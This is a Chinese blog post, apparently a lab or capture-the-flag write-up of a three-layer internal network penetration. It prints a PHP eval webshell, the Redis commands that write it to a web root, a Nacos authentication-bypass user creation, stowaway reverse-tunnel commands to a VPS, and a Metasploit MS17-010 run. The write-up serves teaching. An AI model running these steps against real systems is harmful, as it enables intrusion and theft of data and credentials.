+                ></p>
+<p>删除上传图片的多余部分并修改扩展名为php，其它不用修改，上传成功后看到响应包中的绝对路径，如一直上传失败，且上传方法无误，则可能是DMZ区的机器自动开启的WD杀软，自行关闭即可；</p>
+<hr>
+<p>这里如果失败了，可能是触碰到了CMS的<strong>关键词检测</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="6eeae1439fc940919c1979c5aa19951f.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>可以对一句话木马进行编码，再上传；</p>
+<h4 id="方法三：MySQL日志注入（失败）"><a href="#方法三：MySQL日志注入（失败）" class="headerlink" title="方法三：MySQL日志注入（失败）"></a>方法三：MySQL日志注入（失败）</h4><p>在旁边的管理页面，我还发现存在<code>SQL命令执行工具</code>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="92f81ac752bc42d8b6842f7330a81eb7.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>执行语句发现可以返回结果：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT CURRENT_USER();</span><br><span class="line">SELECT USER();</span><br></pre></td></tr></table></figure></div>
+
+<p>但是想查看日志位置以及开启等敏感操作时，却又<strong>没有回显</strong>了：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW GLOBAL VARIABLES LIKE <span class="string">&quot;%secure%&quot;</span></span><br><span class="line">SHOW VARIABLES LIKE <span class="string">&quot;general_log%&quot;</span>;</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="7e97204aaca84e23946e69579e86d48b.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>分析：</p>
+<ul>
+<li><p><strong>原因一（权限&#x2F;账号层面）</strong></p>
+<ul>
+<li>你当前通过 DedeCMS 注入执行 SQL 时，实际使用的是<strong>受限数据库账号</strong>（如只有 <code>SELECT</code> 权限）；</li>
+<li><code>select users();</code> 这类函数是<strong>允许普通查询返回的</strong>，但 <code>show variables / show global variables</code> 属于<strong>管理级语句</strong>，需要更高权限；</li>
+<li>权限不足就会被 MySQL 直接拒绝或不返回结果。</li>
+</ul>
+</li>
+<li><p><strong>原因二（框架&#x2F;WAF 层面）</strong></p>
+<ul>
+<li>DedeCMS 本身对 SQL 关键字有一定过滤，很多环境还叠加了 WAF&#x2F;安全插件，<strong><code>SHOW</code>、<code>GLOBAL</code>、<code>log</code>、<code>secure</code> 等关键词常被拦截</strong>；</li>
+<li>即便 SQL 注入点可用，框架也可能只允许“返回型 SELECT”，对非查询型或敏感语句直接吞掉结果。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>用蚁剑连接成功后，成功在DMZ主机发现了flag1：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="6739018e50964354bf0c318d86b8a330.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="fscan等工具收集信息"><a href="#fscan等工具收集信息" class="headerlink" title="fscan等工具收集信息"></a>fscan等工具收集信息</h3><p>我们比较幸运，这次拿到的直接就是<strong>SYSTEM权限</strong>：（不然的话还得使用MSF或者CS进行提权）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="9e1fdc2fc6e340998639789b195a218f.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>我们查看网段时发现，DMZ主机有两个网段：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="a38bdad0a052451eaf53365b239b3cf9.png"
+                      alt="在这里插入图片描述"
+                ><br>所以我们合理推测，内网网段还存在其他资产，需要我们进行信息收集；</p>
+<p>上传<code>fscan</code>等工具进行探测：（因为当前主机属于Windows系统，所以执行<strong>fscan.exe</strong>）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="6e4f7dbdddfe422ea778a912135b3ceb.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>上传文件：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="5f48bbb5bca041b4ba30e6af6bbe51d9.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="3c705d624a9648e68f18a7bad583a0d1.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>执行程序，得到结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="9032042ecc6b4b50a5d1d72b03cc1cf8.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>我们可以得到：内网的另一台主机PC开启了许多服务：</p>
+<p>主机：<code>10.10.10.23</code></p>
+<ul>
+<li>80 端口：HTTP 服务（Web 访问）</li>
+<li>6379 端口：Redis 服务（缓存数据库）</li>
+<li>8848 端口：Nacos 服务（服务注册）</li>
+</ul>
+<p>并且根据结果我们可以看到<strong>nacos服务</strong>存在两个可用POC：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- poc-yaml-dedecms-cve-2018-6910</span><br><span class="line">- poc-yaml-alibaba-nacos-v1-auth-bypass </span><br></pre></td></tr></table></figure></div>
+
+<h2 id="内网PC主机横向"><a href="#内网PC主机横向" class="headerlink" title="内网PC主机横向"></a>内网PC主机横向</h2><h3 id="Socks代理搭建"><a href="#Socks代理搭建" class="headerlink" title="Socks代理搭建"></a>Socks代理搭建</h3><blockquote>
+<p>接下来的问题：我们Kali处于外网，如何能够访问到内网进行横向呢？</p>
+<ul>
+<li>搭建隧道代理；</li>
+</ul>
+</blockquote>
+<p>搭建隧道的工具有很多，这里我使用的是<code>stowaway</code>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="2a07aaf086af4f3586ac00bc3e9e4db6.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>这里简单画了个图，方便理解：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="1d81dd5f47ee43399556ba9033103a0e.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>这里我在自己的<code>公网VPS</code>(可以用Kali代替)开启admin节点后：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin -l 9999 -s 123456</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="2b5cf6e4b0524bb3a09baa1b81f952d0.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>在DMZ主机进行客户端连接：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -c VPS地址:9999 -s 123456</span><br></pre></td></tr></table></figure></div>
+
+<p>成功连接节点：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="c2ac92051717446288ce46a1763ade81.png"
+                      alt="在这里插入图片描述"
+                ><br>（可以看到就是DMZ主机的shell）</p>
+<h3 id="（1）浏览器插件转发流量"><a href="#（1）浏览器插件转发流量" class="headerlink" title="（1）浏览器插件转发流量"></a>（1）浏览器插件转发流量</h3><blockquote>
+<p>我们之前不是还碰到了10.10.10.23的内网PC主机吗，现在我们就可以访问其网页了；</p>
+</blockquote>
+<p>先建立一个端口来转发流量：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="e0043e5ebfdb4ec1aff3f9db3b6273ce.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>随后用浏览器插件访问：(用<code>proxifier</code>也行)</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="561ec4289cd64e688dd146d8b1de2ee5.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>成功访问：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="eacf74d3cceb4dec9318811f64fa3359.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="（2）proxifier转发流量"><a href="#（2）proxifier转发流量" class="headerlink" title="（2）proxifier转发流量"></a>（2）proxifier转发流量</h3><p>打开后先选择“<strong>代理服务器”</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="3ac82898379d41f3a034edf2404ef161.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>新建一个，填入VPS &#x2F; Kali地址与端口：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="6bb5cbd6b7d948ae88f86d33320d510a.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>填写<strong>代理规则</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="8e859069c03d4fe395077cc439ffb38c.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>随后即可访问：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="27da852c02724d889932852cf635b5f2.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>proxifier上也可以看到有流量经过：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="612cd0e7342f4ac195863c1cf7a416f8.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="（3）Kali转发流量"><a href="#（3）Kali转发流量" class="headerlink" title="（3）Kali转发流量"></a>（3）Kali转发流量</h3><p>在kali自带的工具里：<code>proxichains</code></p>
+<p>在&#x2F;etc&#x2F;proxychains.conf中进行编辑代理规则，代理地址为VPS（stowaway服务端）的IP及端口：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="a7f3fcf19cbb4a659d71e61347601301.png"
+                      alt="在这里插入图片描述"
+                ><br>随后测试：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="ae432357ad8a4145a99927446c7675e6.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>（10.10.10.23:80下有phpinfo.php文件(后续信息收集得到)，这个方法是我后面想到才加上来的，不然只能给兄弟们学到<strong>两种方法</strong>，太可惜了~）</p>
+<p>完成设置；</p>
+<blockquote>
+<p><strong>注意</strong>：</p>
+<ul>
+<li>使用浏览器插件，只能在浏览其中转发流量；</li>
+<li>使用proxifier，可以在本机PC全局转发流量(也就是说可以使用工具对10.10.10.0&#x2F;24网段探测，而插件是不可以的)</li>
+</ul>
+</blockquote>
+<hr>
+<h3 id="内网PC的80服务"><a href="#内网PC的80服务" class="headerlink" title="内网PC的80服务"></a>内网PC的80服务</h3><blockquote>
+<p><strong>注意</strong>：<code>(重要的事说两次！)</code></p>
+<ul>
+<li>使用浏览器插件，只能在浏览其中转发流量；</li>
+<li>使用<strong>proxifier</strong>，可以在本机PC全局转发流量(也就是说可以使用工具对10.10.10.0&#x2F;24网段探测，而插件是不可以的)</li>
+</ul>
+</blockquote>
+<p>访问 <a class="link"   target="_blank" rel="noopener" href="http://10.10.10.23/%EF%BC%8C%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B%EF%BC%9A" >http://10.10.10.23/，结果如下：<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="06e776301bfb4671a0d8ed0f04f27abc.png"
+                      alt="在这里插入图片描述"
+                ><br><strong>Web枚举</strong>后可以得到一个敏感文件phpinfo：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="69a320e270fa4a7e8c8a9bc8c85efeec.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>进行查看,  通过扫描发现，80端口存在phpinfo文件，此时使用攻击机访问此页面，phpinfo泄露了<strong>绝对路径</strong>  :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="53e1094ef43e4994b96fc52d3f872e93.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p> 那么是否可以根据泄露的绝对路径，使用redis写入webshell进行连接呢？</p>
+<h3 id="内网PC的Redis服务（失败）"><a href="#内网PC的Redis服务（失败）" class="headerlink" title="内网PC的Redis服务（失败）"></a>内网PC的Redis服务（失败）</h3><blockquote>
+<p> 那么是否可以根据泄露的绝对路径，使用redis写入webshell进行连接呢？</p>
+</blockquote>
+<p>我们使用<code>kali连接</code>redis，执行命令看到需要输入密码验证：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains redis-cli -h 10.10.10.23</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="ed0bc406fe9d4399b42e73adda089683.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>可以发现<strong>无密码</strong>成功进入Redis服务：</p>
+<p>想要执行命令，却发现需要认证授权：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="068eeef60d4c4f9fb24873be12b924c3.png"
+                      alt="在这里插入图片描述"
+                ><br>（执行命令看到需要输入密码验证）</p>
+<p>随后尝试密码爆破，但也失败了：</p>
+<h3 id="内网PC的nacos服务"><a href="#内网PC的nacos服务" class="headerlink" title="内网PC的nacos服务"></a>内网PC的nacos服务</h3><blockquote>
+<p><strong>注意</strong>：<code>（重要事情说三次！）</code></p>
+<ul>
+<li>使用浏览器插件，只能在浏览其中转发流量；</li>
+<li>使用proxifier，可以在本机PC全局转发流量(也就是说可以使用工具对10.10.10.0&#x2F;24网段探测，而插件是不可以的)</li>
+</ul>
+</blockquote>
+<p>访问后 <strong><a class="link"   target="_blank" rel="noopener" href="http://10.10.10.23:8848/nacos/#/login" >http://10.10.10.23:8848/nacos/#/login<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong>，页面如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="0bc87b1302384260922e5d390348dcef.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p><code>小阴招：这里我们疯狂点左上角的图标，可以得到它的版本号：</code> <strong>NACOS 2.0.1</strong><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="eab5183bdc3b40a3a23e10c829025e32.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="d088b5bf307a4b44a5a0a30c3a9d84a6.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>对其进行<strong>Web枚举</strong>，查看是否存在其他可利用的目录：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="07fbada51dc8483eb552dff863a5a99c.png"
+                      alt="在这里插入图片描述"
+                ><br>可以看到无可用信息；</p>
+<hr>
+<h3 id="Nacos-2-0-1未授权访问漏洞"><a href="#Nacos-2-0-1未授权访问漏洞" class="headerlink" title="Nacos 2.0.1未授权访问漏洞"></a>Nacos 2.0.1未授权访问漏洞</h3><p>并且根据之前还发现了<strong>nacos服务</strong>存在两个可用POC：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- poc-yaml-alibaba-nacos</span><br><span class="line">- poc-yaml-alibaba-nacos-v1-auth-bypass </span><br></pre></td></tr></table></figure></div>
+<p>根据版本NACOS 2.0.1和两个POC，我们去网上查看它的利用方法：</p>
+<ul>
+<li><strong>第一步：先试试nacos默认口令、弱口令，尝试后后发现不存在弱口令</strong></li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="45d19697788840189bb0775c28b75e4d.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<ul>
+<li><strong>第二步</strong>：即然弱口令不行，那肯定要试一下<code>未授权访问</code>，这里尝试读取用户列表，即&#x2F;<strong>nacos&#x2F;v1&#x2F;auth&#x2F;users</strong></li>
+</ul>
+<p>发现响应包有提示，如下图</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="cf37de09ce1d4e5bbc91f23852c91849.png"
+                      alt="在这里插入图片描述"
+                ><br>那就补上去：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="2e844cf0e9b94959a6e1eb5fc1f00df8.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>终于，<code>/nacos/v1/auth/users?pageNo=1&amp;pageSize=1</code> 返回了结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="7e04dbdb2c6548b8864b223089c87a02.png"
+                      alt="在这里插入图片描述"
+                ><br>随后多次尝试，发现<strong>越来越多</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="e3995886ab6f4951a0483c8cfe61bf5c.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>看到有nacos账户，密码证明漏洞存在；</p>
+<ul>
+<li><strong>第三步：任意用户添加</strong></li>
+</ul>
+<p>访问 <a class="link"   target="_blank" rel="noopener" href="http://10.10.10.23:8848/nacos/v1/auth/users?username=PCuser&password=PCpass" >http://10.10.10.23:8848/nacos/v1/auth/users?username=PCuser&amp;password=PCpass<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 上述链接，抓包修改请求访问为<code>POST</code>，方法即可创建任意用户：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="5be8d63ff6734596832a1cc992ec0b93.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>随后登陆系统：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="cfbef832ec54403aa2f1b7fb395592e7.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p> 进入nacos服务，发现有<code>三个配置文件</code>(nacos低版本在实战中利用漏洞进入系统，往往会泄露大量敏感信息)  </p>
+<p>其中一个为flag：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="25d83de2a2474e40969478393ffb24fd.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>另外两个可能是什么系统的<strong>账号和密码</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="afe38e2112164c08bb7ec23f6f22dce4.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="c6950c8a44274859b2e3ff844d0fc399.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="512c8c4d35f6418aad909038184ac622.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<blockquote>
+<p>有没有可能是SSH密码或者说是Redis服务的密码？</p>
+</blockquote>
+<h3 id="成功登陆Redis服务，并上传Webshell"><a href="#成功登陆Redis服务，并上传Webshell" class="headerlink" title="成功登陆Redis服务，并上传Webshell"></a>成功登陆Redis服务，并上传Webshell</h3><p>分别验证一下，发现确实是Redis服务的：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入密码</span></span><br><span class="line">auth P@ssw0rd_sec</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="38589b7e68304b6ea4e82b405cdb7f24.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>此redis版本存在主从复制漏洞，但无法进行利用；</p>
+<ul>
+<li>因为主从复制漏洞需要<code>本地IP</code> 或者 <code>VPS</code>；</li>
+<li>而当前机器在内网里，映射不到攻击机上面的，所以这里不考虑；</li>
+</ul>
+<hr>
+<p>前面已从phpinfo获取到了web绝对路径，此处尝试写入webshell：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell_PC.php</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\r\n\r\n&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>
+<p>结果如下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="82e1166e438e4ffea7490da4136f82e2.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>前往蚁剑进行连接，此处可以使用蚁剑自行配置代理，或proxifier指定文件：</p>
+<p>访问地址：<code>http://10.10.10.23/shell_PC.php</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="8aadd46c978b4f35b1206a7ad0ad35fd.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>成功拿下二层设备shell，连接身份IP以DMZ的IP进行连接发包；</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="42afa7bfbad744eaa05021c02080208a.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>我们继续进行信息收集，发现了第二层内网网段：<code>10.10.20.0/24</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="43950de2ba874446a770797339b5bef9.png"
+                      alt="在这里插入图片描述"
+                ><br>在根目录下获取flag进行提交：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="5d8fa3395be84bbc9260e9d48d3d5e6a.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<blockquote>
+<p>第二部分考察点：</p>
+<ul>
+<li>主机的信息收集及二层资产扫描              </li>
+<li>敏感文件扫描及可用信息判断              </li>
+<li>其它服务可能存在的漏洞规划              </li>
+<li>漏洞利用技能和信息收集能力              </li>
+<li>特定服务的漏洞利用最大化</li>
+</ul>
+</blockquote>
+<h2 id="内网服务器横向"><a href="#内网服务器横向" class="headerlink" title="内网服务器横向"></a>内网服务器横向</h2><p>在上面我们拿到了内网二层设备的shell权限，以及相对性的进行flag信息收集步骤，在接着查看网卡信息，看到还有<code>10.10.20.0/24</code>段</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="c4f4fefa38a14fdb998d08b0695062bb.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>还是老样子，仍然使用<code>fscan</code>工具进行扫描，因为二层设备是Linux，所以使用<strong>fscan-Linux版本</strong>进行扫描（stowaway也得使用Linux版本~）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="932a9778073946da869228aec514584c.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>这里我上传到 &#x2F;tmp 目录下；</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x fscan</span><br><span class="line">./fscan -h 10.10.20.0/24</span><br></pre></td></tr></table></figure></div>
+<p>结果如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="54920b47407d4613b29ccf2abe62448d.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>还有可用的POC：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">10.10.20.11:8848 open</span><br><span class="line">10.10.20.11:22 open</span><br><span class="line">10.10.20.11:6379 open</span><br><span class="line">10.10.20.12:445 open</span><br><span class="line">10.10.20.12:139 open</span><br><span class="line">10.10.20.12:135 open</span><br><span class="line">10.10.20.12:9008 open</span><br><span class="line">10.10.20.11:80 open</span><br><span class="line">[*] WebTitle http://10.10.20.11        code:200 len:0      title:None</span><br><span class="line">[*] WebTitle http://10.10.20.11:8848   code:404 len:431    title:HTTP Status 404 – Not Found</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]10.10.20.12</span><br><span class="line">   [-&gt;]ok-PC</span><br><span class="line">   [-&gt;]192.168.44.145</span><br><span class="line">   [-&gt;]10.10.20.12</span><br><span class="line">[*] OsInfo 10.10.20.12	(Windows 7 Enterprise 7601 Service Pack 1)</span><br><span class="line">[+] PocScan http://10.10.20.11:8848 poc-yaml-alibaba-nacos </span><br><span class="line">[*] WebTitle https://10.10.20.12:9008  code:403 len:245    title:403 Forbidden</span><br><span class="line">[+] PocScan http://10.10.20.11:8848 poc-yaml-alibaba-nacos-v1-auth-bypass </span><br></pre></td></tr></table></figure></div>
+
+<h3 id="配置二层socks代理"><a href="#配置二层socks代理" class="headerlink" title="配置二层socks代理"></a>配置二层socks代理</h3><p>随后我们在DMZ主机上执行<code>admin服务端</code>，内网PC主机则执行<code>agent客户端</code>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="57ae12bb328c47c0a42f2504ff71e1ec.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>进入node 0 节点，设置监听端口，开启监听模式：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="f4bca42b73924ed5b1576209cc6dd2c5.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<ul>
+<li>DMZ主机（Windows主机）</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="da5ba9223d1b4c56a42244553e73b29c.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent -c 10.10.10.22 -s 123456</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>服务端：成功上线一个新的node 1</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="55ad4c44b192439598335979c2786c98.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="方法一：打开kali，通过MSF进行攻击："><a href="#方法一：打开kali，通过MSF进行攻击：" class="headerlink" title="方法一：打开kali，通过MSF进行攻击："></a>方法一：打开kali，通过MSF进行攻击：</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> proxies socks5:117.72.218.141:1082</span><br><span class="line"><span class="built_in">set</span> rhosts 10.10.20.12]</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+<p>最后打开3389，访问桌面：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="fad615ac35d8465b9e2aba1c89f0b3fd.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="方法二：proxifier添加新代理"><a href="#方法二：proxifier添加新代理" class="headerlink" title="方法二：proxifier添加新代理"></a>方法二：proxifier添加新代理</h3><p>添加新的代理服务器：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="99d579e6c0434d90ab1ab2d565f37182.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>新的代理规则：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="981fc0306f294168b9e892e384de0b48.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>如果内网服务器，开放有http等服务，输入 <a class="link"   target="_blank" rel="noopener" href="http://10.10.20.12/" >http://10.10.20.12<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 即可访问；</p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，内网横向是一件很好玩的事情，限制于篇幅，我无法把所有的方法都展现出来；</p>
+<p>   不止三层，如有N层都可以用此方法进行渗透测试，希望本篇文章及视频帮助到大家(学习、大赛、工作、兴趣爱好)</p>
+<blockquote>
+<p>期待下次再见；</p>
+</blockquote>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 内网提权教程——记录某三层网络渗透及综合渗透(socks代理隧道搭建，nacos未授权，redis上传Webshell)</li>
+        <li><strong>作者:</strong> W1nner丶</li>
+        <li><strong>创建于
+                :</strong> 2026-02-02 18:41:53</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2026-06-04 10:34:05
+            </li>
+        
+        <li>
